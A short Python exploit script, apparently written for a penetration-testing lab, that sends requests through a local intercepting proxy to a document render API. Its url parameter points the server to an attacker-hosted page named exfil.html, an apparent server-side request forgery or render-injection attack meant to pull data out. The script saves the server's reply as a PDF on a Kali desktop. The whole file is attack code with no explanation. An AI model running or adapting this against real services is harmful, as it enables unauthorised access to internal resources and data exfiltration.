import requests
json_p = {"url":"http://172.xxx.xxx.6:9000/api/render?url=http://192.168.45.230/exfil.html"}
proxy = {
      "http":"http://127.0.0.1:8080",
      "https":"http://127.0.0.1:8080"
}

#r = requests.post(url='http://xxxx:8000/files/import',json=json_p,proxies=proxy)
r = requests.get(url='http://xxxxy:8000/render?apikey=xxxx0&url=http://192.xxx.xxx.230',json=json_p,proxies=proxy)

#print ("Status Code={code}\n {text}".format(code=r.status_code,text=r.text))
print(r.content)

with open("/home/kali/Desktop/response.pdf",'wb') as f:
    f.write(r.content)
